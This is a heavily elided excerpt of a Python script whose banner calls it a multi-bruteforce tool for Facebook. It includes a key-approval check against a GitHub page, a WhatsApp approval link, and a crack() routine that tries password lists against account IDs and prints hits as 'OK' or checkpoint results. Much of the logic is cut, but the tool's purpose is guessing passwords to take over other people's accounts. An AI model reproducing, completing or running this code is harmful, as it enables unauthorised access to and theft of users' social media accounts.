...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mUPPU DON ')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/UPPU-DON/UP3NDR4-DON').text
		ua=open('.bbnew.txt','w')
...
def xoshnaw(): 
  ...
  try: 
    httpCaht = requests.get("https://github.com/UPPU-DON/UP3NDR4-DON").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open https://wa.me/+9779815507117?text=SIR+UPPU DON+PLEASE+APPROVR+MY+KEY') 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def banner():
	...
	print("""
     ...
     SCRIPT MULTI BRUTEFORCE FOR FACEBOOK BY MR.UPPU DON
...
def login_lagi334():
	try:
		...
		print(f'  {u}[{h}UPPU DON{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[UPPU DON ]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]×[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[UPPU DON -CP] {idf}  {pw} {N}')     
				...
				print(f'\r{H}[UPPU DON -OK] {idf}  {pw}')
